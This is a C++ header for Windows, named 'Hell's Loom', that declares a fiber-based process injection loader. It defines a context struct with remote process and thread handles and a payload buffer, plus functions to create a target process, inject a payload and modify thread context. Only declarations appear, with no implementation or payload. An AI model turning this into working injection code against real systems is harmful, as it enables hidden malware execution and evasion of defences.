#ifndef HELLS_LOOM_H
#define HELLS_LOOM_H

#include <windows.h>
#include <winternl.h>
#include <string>

#define FIBER_STACK_SIZE 1024 * 64
#define PAYLOAD_SIZE 8192

typedef struct _FIBER_CONTEXT {
    LPVOID mainFiber;
    LPVOID workerFiber;
    LPVOID helperFiber;
    BYTE* buffer;
    SIZE_T bufferSize;
    DWORD pid;
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID remoteAddr;
    BOOL initialized;
    DWORD switchCount;
    CONTEXT threadContext;
} FIBER_CONTEXT, *PFIBER_CONTEXT;

class ProcessManager {
private:
    FIBER_CONTEXT ctx;
    std::wstring targetPath;
    
    BOOL SetupMainFiber();
    BOOL CreateWorkerFiber();
    BOOL CreateHelperFiber();
    BOOL SwitchToWorker();
    BOOL InjectPayload();
    BOOL Cleanup();
    
public:
    ProcessManager(const std::wstring& target);
    ~ProcessManager();
    
    BOOL Run();
    
    static VOID CALLBACK WorkerProc(LPVOID lpParameter);
    static VOID CALLBACK HelperProc(LPVOID lpParameter);
};

BOOL CreateTargetProcess(const std::wstring& path, PROCESS_INFORMATION* pi);
BOOL ModifyThreadContext(HANDLE hThread, LPVOID entryPoint);

#endif
